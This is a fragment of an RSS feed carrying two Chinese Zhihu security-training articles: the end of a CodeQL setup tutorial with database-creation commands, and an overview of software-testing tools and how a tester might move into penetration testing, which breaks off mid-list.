data-original=&quot;https://pic3.zhimg.com/v2-339e991f3de1cbb9783d13058d60724e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-339e991f3de1cbb9783d13058d60724e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1510&quot; data-rawheight=&quot;710&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1510&quot; data-original=&quot;https://pic3.zhimg.com/v2-339e991f3de1cbb9783d13058d60724e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-339e991f3de1cbb9783d13058d60724e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;安装后，我们的 VS Code 会多一个侧边工具栏👇&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-21cacbc48f892e7180450f43a7776baf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;247&quot; data-rawheight=&quot;345&quot; class=&quot;content_image&quot; width=&quot;247&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-21cacbc48f892e7180450f43a7776baf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;247&quot; data-rawheight=&quot;345&quot; class=&quot;content_image lazy&quot; width=&quot;247&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-21cacbc48f892e7180450f43a7776baf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;进行一些相关配置，在 cli 填写下载的 CodeQL 路径，windows 下可以填写 codeql.cmd 的路径；其他配置默认。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7ed604c846dac776e6c9da873acf1e79_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1577&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1577&quot; data-original=&quot;https://pic2.zhimg.com/v2-7ed604c846dac776e6c9da873acf1e79_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7ed604c846dac776e6c9da873acf1e79_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1577&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1577&quot; data-original=&quot;https://pic2.zhimg.com/v2-7ed604c846dac776e6c9da873acf1e79_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-7ed604c846dac776e6c9da873acf1e79_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;设置CodeQL工作区&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我这里使用官方的“入门”工作区，直接下载即可。&lt;/p&gt;&lt;p&gt;“入门”工作区：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/github/vscode-codeql-starter/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/github/vscod&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;e-codeql-starter/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;内容丰富，包含了：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;CodeQL 库和 C/C++、C＃、Java、JavaScript 和 Python 查询的存储库。&lt;/li&gt;&lt;li&gt;CodeQL 库和 Go 查询的存储库作为子模块包含在内，可以在不影响自定义查询的情况下进行更新。 &lt;/li&gt;&lt;li&gt;一系列名为的文件夹 codeql-custom-queries-&amp;lt;language&amp;gt;。你可以使用标准库开始针对每种语言开发自己的自定义查询，有一些示例查询可以帮助你入门。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在 VS Code 中，使用 &lt;b&gt;File &lt;/b&gt;&amp;gt; &lt;b&gt;Open Workspace&lt;/b&gt; 选项 vscode-codeql-starter.code-workspace 从你的工作区存储库标签中打开文件。&lt;/p&gt;&lt;p&gt;&lt;b&gt;创建CodeQL数据库&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;codeql database create &amp;lt;database&amp;gt; --language=&amp;lt;language-identifier&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;database&amp;gt;：要创建的新数据库的路径。执行命令时将创建此目录，你无法指定现有目录。&lt;/li&gt;&lt;li&gt;--language：用于为其创建数据库的语言的标识符。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;CodeQL 支持为以下语言创建数据库：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-27172a42037b6d29c69bc24558ba4464_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;370&quot; data-rawheight=&quot;236&quot; class=&quot;content_image&quot; width=&quot;370&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-27172a42037b6d29c69bc24558ba4464_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;370&quot; data-rawheight=&quot;236&quot; class=&quot;content_image lazy&quot; width=&quot;370&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-27172a42037b6d29c69bc24558ba4464_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可以指定其他选项，具体取决于源文件的位置和要分析的语言：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;--source-root：数据库创建中使用的主要源文件的根文件夹。默认情况下，该命令假定当前目录是源根目录，使用此选项可以指定其他位置。&lt;/li&gt;&lt;li&gt;--command：对于已编译的语言，调用编译器的构建命令，解释型语言不需要此选项。命令将从当前文件夹或--source-root指定的位置运行。如果不包含--command，CodeQL 将尝试使用内置的自动生成器自动检测生成系统。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;我这里建了个关于 python 的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;codeql database create --language=python &amp;lt;output-folder&amp;gt;/python-database&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-14db006ad42db4375f71153f944237ec_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1835&quot; data-rawheight=&quot;236&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1835&quot; data-original=&quot;https://pic1.zhimg.com/v2-14db006ad42db4375f71153f944237ec_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-14db006ad42db4375f71153f944237ec_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1835&quot; data-rawheight=&quot;236&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1835&quot; data-original=&quot;https://pic1.zhimg.com/v2-14db006ad42db4375f71153f944237ec_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-14db006ad42db4375f71153f944237ec_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;VS Code 打开 ql 库文件，在 ql 选择夹中添加刚才创建的数据库文件，并设置为当前数据库。&lt;/p&gt;&lt;p&gt;然后我们使用官方提供的 example.ql&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ccd924cc76428ad189559067af5d56bc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;562&quot; data-rawheight=&quot;323&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;562&quot; data-original=&quot;https://pic1.zhimg.com/v2-ccd924cc76428ad189559067af5d56bc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ccd924cc76428ad189559067af5d56bc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;562&quot; data-rawheight=&quot;323&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;562&quot; data-original=&quot;https://pic1.zhimg.com/v2-ccd924cc76428ad189559067af5d56bc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-ccd924cc76428ad189559067af5d56bc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;准备好这些之后，就可以开始代码分析工作了，最主要还是 QL 文件的编写，可通过官方文档进行这方面的进一步学习。&lt;/p&gt;&lt;p&gt;有关 &lt;b&gt;CodeQL&lt;/b&gt; 的内容就简单介绍到这里，向作者致敬。更多资讯请关注 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行了解，最近推出了一系列免费的网络安全技能包，有关渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe65256149738f54b5bfcbd1ae5c9f1b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic4.zhimg.com/v2-fe65256149738f54b5bfcbd1ae5c9f1b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe65256149738f54b5bfcbd1ae5c9f1b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic4.zhimg.com/v2-fe65256149738f54b5bfcbd1ae5c9f1b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fe65256149738f54b5bfcbd1ae5c9f1b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-23-92769710</guid>
<pubDate>Sat, 23 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>软件测试如何转渗透测试？</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-23-92418629.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/92418629&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-add6d38688dacd8b8ca8011cb167e7c6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;随着时代的不断发展，软件测试这一行越来越不好做了，各种自动化工具的普遍，再加上00后都开始抢饭碗了（开个玩笑）。&lt;/p&gt;&lt;blockquote&gt;软件测试：（Software Testing），一种用来促进鉴定软件的正确性、完整性、安全性和质量的过程。换句话说，软件测试是一种实际输出与预期输出之间的审核或者比较过程。&lt;br/&gt;软件测试的经典定义是：在规定的条件下对程序进行操作，以发现程序错误，衡量软件质量，并对其是否能满足设计要求进行评估的过程。&lt;/blockquote&gt;&lt;p&gt;做软件测试是离不开工具的，通过一些工具能够使软件的一些简单问题直观的显示在测试人员的面前，这样能使测试人员更好的找出软件错误的所在。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d0013af51101d65b663403f4581102f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;528&quot; data-rawheight=&quot;348&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;528&quot; data-original=&quot;https://pic4.zhimg.com/v2-d0013af51101d65b663403f4581102f7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d0013af51101d65b663403f4581102f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;528&quot; data-rawheight=&quot;348&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;528&quot; data-original=&quot;https://pic4.zhimg.com/v2-d0013af51101d65b663403f4581102f7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d0013af51101d65b663403f4581102f7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;软件测试工具分为 自动化软件测试工具 和 测试管理工具。&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;自动化软件测试工具存在的价值是为了提高测试效率，用软件来代替一些人工输入。&lt;/li&gt;&lt;li&gt;测试管理工具是为了复用测试用例，提高软件测试的价值。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;一个好的软件测试工具和测试管理工具结合起来使用将会使软件测试效率大大提高。&lt;/p&gt;&lt;p&gt;&lt;b&gt;下面简单的介绍几种软件测试工具&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;Openstack&lt;/h2&gt;&lt;p&gt;是专用于 B/S 结构的、免费的性能测试工具。它的优点除了免费、源代码开放的优点外，还能对录制的测试脚本进行，按指定的语法进行编辑。在录制完测试脚本后，可以对测试脚本进行编辑，以便进行特定的性能指标分析。其较为丰富的图形化测试结果大大提高了测试报告的可阅读性。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-46f5afa9e9464c08a8c9d1ae0c388743_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;572&quot; data-rawheight=&quot;453&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;572&quot; data-original=&quot;https://pic4.zhimg.com/v2-46f5afa9e9464c08a8c9d1ae0c388743_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-46f5afa9e9464c08a8c9d1ae0c388743_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;572&quot; data-rawheight=&quot;453&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;572&quot; data-original=&quot;https://pic4.zhimg.com/v2-46f5afa9e9464c08a8c9d1ae0c388743_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-46f5afa9e9464c08a8c9d1ae0c388743_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;QTP&lt;/h2&gt;&lt;p&gt;一个 B/S 系统的自动化功能测试的利器，软件程序测试工具。Mercury 的自动化功能测试软件 QuickTest Professional ，可以覆盖绝大多数的软件开发技术，简单高效，并具备测试用例可重用的特点。Mercury QuickTest Pro 是一款先进的自动化测试解决方案，用于创建功能和回归测试。它自动捕获、验证和重放用户的交互行为，为每一个重要软件应用和环境提供功能和回归测试自动化的行业最佳解决方案。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d302185b786bb3c282e3a6f87e853bfe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;738&quot; data-rawheight=&quot;487&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;738&quot; data-original=&quot;https://pic3.zhimg.com/v2-d302185b786bb3c282e3a6f87e853bfe_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d302185b786bb3c282e3a6f87e853bfe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;738&quot; data-rawheight=&quot;487&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;738&quot; data-original=&quot;https://pic3.zhimg.com/v2-d302185b786bb3c282e3a6f87e853bfe_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-d302185b786bb3c282e3a6f87e853bfe_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;JMeter&lt;/h2&gt;&lt;p&gt;Apache 组织开发的基于 Java 的压力测试工具。用于对软件做压力测试，它最初被设计用于 Web 应用测试，但后来扩展到其他测试领域。 它可以用于测试静态和动态资源，例如静态文件、Java 小服务程序、CGI 脚本、Java 对象、数据库、FTP 服务器等等。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-036902d5f2998119b55fd8e7be12d49e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;590&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;893&quot; data-original=&quot;https://pic3.zhimg.com/v2-036902d5f2998119b55fd8e7be12d49e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-036902d5f2998119b55fd8e7be12d49e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;590&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;893&quot; data-original=&quot;https://pic3.zhimg.com/v2-036902d5f2998119b55fd8e7be12d49e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-036902d5f2998119b55fd8e7be12d49e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;WebInject&lt;/h2&gt;&lt;p&gt;一个自动化测试工具，主要适合 Web 应用和 Web 服务。可以通过它来测试基于 HTTP 接口的系统组件，还可以用它来进行服务器监控。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f475cd364aaf9a20a8762cdc186b54f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;221&quot; data-rawheight=&quot;200&quot; class=&quot;content_image&quot; width=&quot;221&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f475cd364aaf9a20a8762cdc186b54f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;221&quot; data-rawheight=&quot;200&quot; class=&quot;content_image lazy&quot; width=&quot;221&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-5f475cd364aaf9a20a8762cdc186b54f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;BugFree&lt;/h2&gt;&lt;p&gt;借鉴微软的研发流程和 Bug 管理理念，使用 PHP+MySQL 独立写出的一个 Bug 管理系统。简单实用、免费并且开放源代码（遵循GNU GPL）。命名 BugFree 有两层意思：一是希望软件中的缺陷越来越少直到没有；二是表示它是免费且开放源代码的，可以自由使用传播。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e9d7e9fe7f6e8b78a20209bb16aff57e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;463&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-e9d7e9fe7f6e8b78a20209bb16aff57e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e9d7e9fe7f6e8b78a20209bb16aff57e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;463&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-e9d7e9fe7f6e8b78a20209bb16aff57e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e9d7e9fe7f6e8b78a20209bb16aff57e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;Bugzilla&lt;/h2&gt;&lt;p&gt;一个开源的缺陷跟踪系统（Bug-Tracking System），它可以管理软件开发中缺陷的提交（new），修复（resolve），关闭（close）等整个生命周期。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8892429629fc3fc3c197dd2b0008451b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;296&quot; class=&quot;content_image&quot; width=&quot;400&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8892429629fc3fc3c197dd2b0008451b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;296&quot; class=&quot;content_image lazy&quot; width=&quot;400&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-8892429629fc3fc3c197dd2b0008451b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;selenium-core&lt;/h2&gt;&lt;p&gt;使用 HTML 的方式来编写测试脚本，你也可以使用 Selenium-IDE 来录制脚本，但是目前 Selenium-IDE 只有 FireFox 版本。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3346473208ae58223d428e45c22f6e34_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;131&quot; data-rawheight=&quot;136&quot; class=&quot;content_image&quot; width=&quot;131&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3346473208ae58223d428e45c22f6e34_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;131&quot; data-rawheight=&quot;136&quot; class=&quot;content_image lazy&quot; width=&quot;131&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-3346473208ae58223d428e45c22f6e34_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;Testlink&lt;/h2&gt;&lt;p&gt;用于进行测试过程中的管理，通过使用 TestLink 提供的功能，可以将测试过程从测试需求、测试设计、到测试执行完整的管理起来，同时，它还提供了好多种测试结果的统计和分析，使我们能够简单的开始测试工作和分析测试结果。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cf2626556c9485faf9c9906b83f2abf0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;699&quot; data-rawheight=&quot;461&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;699&quot; data-original=&quot;https://pic1.zhimg.com/v2-cf2626556c9485faf9c9906b83f2abf0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cf2626556c9485faf9c9906b83f2abf0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;699&quot; data-rawheight=&quot;461&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;699&quot; data-original=&quot;https://pic1.zhimg.com/v2-cf2626556c9485faf9c9906b83f2abf0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cf2626556c9485faf9c9906b83f2abf0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;TMantis&lt;/h2&gt;&lt;p&gt;一个基于 PHP 技术的轻量级的缺陷跟踪系统，其功能与前面提及的 JIRA 系统类似，都是以 Web 操作的形式提供项目管理及缺陷跟踪服务。在功能上可能没有 JIRA 那么专业，界面也没有 JIRA 好看，但在实用性上足以满足中小型项目的管理及跟踪。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a570905b533927eba4b62d616ef92d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;346&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-a570905b533927eba4b62d616ef92d38_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a570905b533927eba4b62d616ef92d38_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;346&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-a570905b533927eba4b62d616ef92d38_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-a570905b533927eba4b62d616ef92d38_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;MaxQ&lt;/h2&gt;&lt;p&gt;一个 Web 功能测试工具。它包括一个记录测试脚本的 HTTP 代理，一个用于重放测试的命令行实用程序。代理记录器自动存储提交到表单的变量，无需自己记录。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-da647ef2b042479cd48fdc49ce29c64c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;452&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-da647ef2b042479cd48fdc49ce29c64c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-da647ef2b042479cd48fdc49ce29c64c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;452&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-da647ef2b042479cd48fdc49ce29c64c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-da647ef2b042479cd48fdc49ce29c64c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;软件测试的流程&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;测试需求分析阶段：阅读需求，理解需求，主要就是对业务的学习，分析需求点，参与需求评审会议&lt;/li&gt;&lt;li&gt;测试计划阶段：主要任务就是编写测试计划，参考软件需求规格说明书，项目总体计划，内容包括测试范围（来自需求文档），进度安排，人力物力的分配，整体测试策略的制定。风险评估与规避措施有一个制定。&lt;/li&gt;&lt;li&gt;测试设计阶段：主要是编写测试用例，会参考需求文档（原型图），概要设计，详细设计等文档，用例编写完成之后会进行评审。&lt;/li&gt;&lt;li&gt;测试执行阶段：搭建环境，执行冒烟测试（预测试）-然后进入正式测试，bug管理直到测试结束。&lt;/li&gt;&lt;li&gt;测试评估阶段：出测试报告，确认是否可以上线。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;其中在测试执行阶段，进行环境的搭建，一些预测试等，然后寻找漏洞，错误测试等等，与网络安全中的渗透测试大同小异。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;作为一个渗透测试人员，每天的工作就是面对 web 的应用、网络、系统的安全漏洞。 用另一种话说，就是你被付薪水来做合法 hacker。在这个很酷的工作，你将会使用一系列的渗透测试工具一些是预先决定的，一些事你自己设计的，来模拟真实生活中的网络攻击。你的最终目标就是帮助组织证明他们的安全性。&lt;/p&gt;&lt;p&gt;【合法的 hacking 是“性感”和“无聊”的混合（真的是无聊，天天写报告）。不像真实世界的黑客（可以为所欲为），你可能只有几天的时间来侵入一个系统。甚至，你要表达清楚你使用的方法和技术。渗透测试被称作信息安全领域最令人沮丧的工作之一】&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cf1df0537eae8bf887818435f30bac90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;363&quot; data-rawheight=&quot;221&quot; class=&quot;content_image&quot; width=&quot;363&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cf1df0537eae8bf887818435f30bac90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;363&quot; data-rawheight=&quot;221&quot; class=&quot;content_image lazy&quot; width=&quot;363&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cf1df0537eae8bf887818435f30bac90_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;你可能做一些事，比如：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;执行一个常规渗透测试给基于web的程序网络以及计算机系统。&lt;/li&gt;&lt;li&gt;给服务器系网络设置进行一个物理性安全评估。&lt;/li&gt;&lt;li&gt;设计和创建一个新的渗透测试工具。&lt;/li&gt;&lt;li&gt;探测 web 